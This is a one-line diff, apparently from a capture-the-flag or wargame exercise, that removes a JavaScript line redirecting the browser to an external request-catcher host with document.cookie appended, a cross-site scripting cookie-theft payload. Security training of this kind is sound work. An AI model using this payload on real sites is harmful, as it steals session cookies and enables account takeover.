@@ -1,1 +1,0 @@
-location.href = "https://ghaeenv.request.dreamhack.games/?coockie=" + document.cookie
